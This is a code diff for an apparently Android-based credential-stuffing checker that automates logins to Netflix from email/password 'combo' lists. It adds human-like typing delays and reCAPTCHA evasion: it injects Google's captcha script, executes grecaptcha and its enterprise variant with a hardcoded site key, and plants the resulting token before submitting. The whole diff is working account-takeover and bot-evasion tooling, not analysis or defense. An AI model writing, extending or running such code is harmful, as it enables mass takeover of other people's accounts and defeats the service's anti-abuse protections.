@@ -544,6 +544,7 @@ stats.cpm = stats.computeCpm()
                 var fillCount = 0
                 var submittedAt = 0L
                 var lastTokLogged = ""
+                var lastTokGraphql = ""
 
                 fun settle(acc: Account) {
                     if (settled) return
@@ -566,7 +567,7 @@ stats.cpm = stats.computeCpm()
 
                 fun pollResult() {
                     if (settled) return
-                    val js = """(function(){var u=location.href;var tt=document.title||'';var b='';try{b=document.body?document.body.innerText||'':'';}catch(x){}var t=b.slice(-1200).replace(/\s+/g,' ');var err=!!(document.querySelector('[data-uia="alert-error"]')||document.querySelector('[data-uia="field-error"]')||document.querySelector('.hasError'));var cap=!!document.querySelector('iframe[src*="recaptcha"]');var sb='';try{sb=window.__sb_screen_body||'';}catch(e){}var fs=(window.__silverbullet||'');return JSON.stringify({u:u,tt:tt,t:t,err:err,cap:cap,fs:fs,sb:sb});})()"""
+                    val js = """(function(){var u=location.href;var tt=document.title||'';var b='';try{b=document.body?document.body.innerText||'':'';}catch(x){}var t=b.slice(-1200).replace(/\s+/g,' ');var err=!!(document.querySelector('[data-uia="alert-error"]')||document.querySelector('[data-uia="field-error"]')||document.querySelector('.hasError'));var cap=!!document.querySelector('iframe[src*="recaptcha"]');var sb='';try{sb=window.__sb_screen_body||'';}catch(e){}var fs=(window.__silverbullet||'');var tk='';try{tk=window.__sb_tok||'';}catch(e){}var tke='';try{tke=window.__sb_tok_err||'';}catch(e){}var sig='';try{sig=window.__sb_submit_sig||'';}catch(e){}var rci='';try{rci=window.__sb_rc_inj||'';}catch(e){}return JSON.stringify({u:u,tt:tt,t:t,err:err,cap:cap,fs:fs,sb:sb,tkl:tk.length+"",tke:tke,sig:sig,rci:rci});})()"""
                     wv.evaluateJavascript(js) { raw ->
                         if (settled) return@evaluateJavascript
                         val data = try {
@@ -583,9 +584,18 @@ stats.cpm = stats.computeCpm()
                         val bodyText = (data?.optString("t", "") ?: "").lowercase()
                         val sb = data?.optString("sb", "") ?: ""
                         val tok = sb.contains("\"recaptchaResponseToken\":\"") && !sb.contains("\"recaptchaResponseToken\":\"\"")
-                        if (sb.isNotEmpty() && lastTokLogged != "$tok") {
-                            lastTokLogged = "$tok"
+                        if (sb.isNotEmpty() && lastTokGraphql != "$tok") {
+                            lastTokGraphql = "$tok"
                             log("Netflix(browser): GraphQL ScreenUpdate captured, recaptchaTokenPresent=$tok len=${sb.length}")
+                        }
+                        val tkl = data?.optString("tkl", "") ?: ""
+                        val tkErr = data?.optString("tke", "") ?: ""
+                        val sig = data?.optString("sig", "") ?: ""
+                        val rci = data?.optString("rci", "") ?: ""
+                        val tokKey = "$tkl|$sig|$tkErr|$rci"
+                        if (tokKey != lastTokLogged && (tkl.isNotEmpty() || tkErr.isNotEmpty() || sig.isNotEmpty())) {
+                            lastTokLogged = tokKey
+                            log("Netflix(browser): recaptcha tokLen=$tkl src=$sig err=$tkErr injected=$rci")
                         }
 
                         val stateKey = "u=$url|fs=$fs|err=$err"
@@ -702,18 +712,43 @@ stats.cpm = stats.computeCpm()
         val pass = JSONObject.quote(combo.password)
         val js = """(function(){
 try{
-var EMAIL=%EMAIL%;var PASS=%PASS%;var started=false;
+var EMAIL=%EMAIL%;var PASS=%PASS%;var enabled={ep:false,inj:false,ttl:false,ent:false};var started=false;
 function setVal(el,v){var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;s.call(el,v);el.dispatchEvent(new Event('input',{bubbles:true}));}
 function typeText(el,text,done){var i=0;var t=setInterval(function(){if(i>=text.length){clearInterval(t);el.dispatchEvent(new Event('change',{bubbles:true}));done();return;}i++;setVal(el,text.slice(0,i));el.dispatchEvent(new Event('keyup',{bubbles:true}));},55+Math.floor(Math.random()*45));}
 function fields(){var u=document.querySelector('#id_userLoginId')||document.querySelector('input[name="userLoginId"]')||document.querySelector('input[type="email"]');var p=document.querySelector('#id_password')||document.querySelector('input[type="password"]');return (u&&p)?{u:u,p:p}:null;}
-function clickBtn(){var b=document.querySelector('[data-uia="login-submit-button"]')||document.querySelector('button[type="submit"]')||document.querySelector('[data-uia="primary-action"]');if(!b){window.__silverbullet='no_button';return;}try{window.scrollTo(0,window.innerHeight*0.3);window.scrollTo(0,0);}catch(e){}
+function setRecap(t){var r=document.querySelector('#g-recaptcha-response');if(r){r.value=t;r.dispatchEvent(new Event('input',{bubbles:true}));r.dispatchEvent(new Event('change',{bubbles:true}));}}
+function clickBtn(sig){var b=document.querySelector('[data-uia="login-submit-button"]')||document.querySelector('button[type="submit"]')||document.querySelector('[data-uia="primary-action"]');if(!b){window.__silverbullet='no_button';return;}window.__sb_submit_sig=sig||'';try{window.scrollTo(0,window.innerHeight*0.3);window.scrollTo(0,0);}catch(e){}
 ['pointerdown','mousedown','pointerup','mouseup','click'].forEach(function(t){b.dispatchEvent(new MouseEvent(t,{bubbles:true,cancelable:true,view:window}));});
 window.__silverbullet='submitted';}
-function waitCap(){var n=0;var t=setInterval(function(){n++;if(window.grecaptcha||document.querySelector('iframe[src*="recaptcha"]')||n>55){clearInterval(t);setTimeout(clickBtn,350+Math.floor(Math.random()*400));}},200);}
+function promiseTimeout(p,ms){return Promise.race([p,new Promise(function(res){setTimeout(function(){res('__SB_TOK_TIMEOUT__');},ms);})]);}
+function doExec(apiName,reload){
+if(attempts>=5){return submitFinal('max-attempts');}
+attempts++;
+var parts=apiName.split('.');
+var api=window;for(var i=0;i<parts.length;i++){api=api[parts[i]];if(!api)break;}
+if(!api){
+window.__sb_tok_err=apiName+'-undefined';
+if(reload&&!enabled.inj){enabled.inj=true;var s=document.createElement('script');s.src='https://www.google.com/recaptcha/api.js?render=__SITEKEY__';s.onload=function(){window.__sb_rc_inj='ok';setTimeout(function(){doExec(apiName,false);},400);};s.onerror=function(){window.__sb_rc_inj='err';setTimeout(function(){doExec(apiName,false);},400);};document.head.appendChild(s);}
+else{moveNext(apiName);}
+return;
+}
+try{
+promiseTimeout(window[apiName].execute('__SITEKEY__',{action:'login'}),14000).then(function(t){
+if(t!=='__SB_TOK_TIMEOUT__'&&t&&t.length>20){window.__sb_tok=t;setRecap(t);window.__sb_tok_from=apiName;submitFinal('token-'+apiName);}
+else{moveNext(apiName+(t==='__SB_TOK_TIMEOUT__'?'-timeout':'-empty'));}
+},function(e){moveNext(apiName+'-reject:'+(e&&e.message||''));});
+}catch(e){moveNext(apiName+'-throw:'+(e&&e.message||''));}
+}
+function moveNext(reason){window.__sb_tok_err=reason;
+if(!enabled.ent){enabled.ent=true;return doExec('grecaptcha.enterprise',true);}
+submitFinal('no-token:'+reason);}
+function submitFinal(sig){setTimeout(function(){clickBtn(sig);},250+Math.floor(Math.random()*350));}
+var attempts=0;
 function go(){var f=fields();if(!f){window.__silverbullet='no_fields';return;}
-if(f.u.value&&f.p.value){waitCap();return;}
 window.__silverbullet='fields_found';
-typeText(f.u,EMAIL,function(){typeText(f.p,PASS,function(){waitCap();});});}
+typeText(f.u,EMAIL,function(){typeText(f.p,PASS,function(){
+window.__sb_tok='';doExec('grecaptcha',true);
+});});}
 var w=setInterval(function(){
 if(document.querySelector('[data-uia="alert-error"],[data-uia="field-error"],.hasError')){window.__silverbullet='error_visible';clearInterval(w);return;}
 if(!started&&fields()){started=true;clearInterval(w);go();}
@@ -722,7 +757,9 @@ setTimeout(function(){if(!started){window.__silverbullet='no_fields';}},15000);
 }catch(e){window.__silverbullet='fill_js_err';}
 })()"""
         view.evaluateJavascript(
-            js.replace("%EMAIL%", email).replace("%PASS%", pass), null
+            js.replace("%EMAIL%", email).replace("%PASS%", pass)
+                .replace("__SITEKEY__", "6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"),
+            null
         )
     }
 
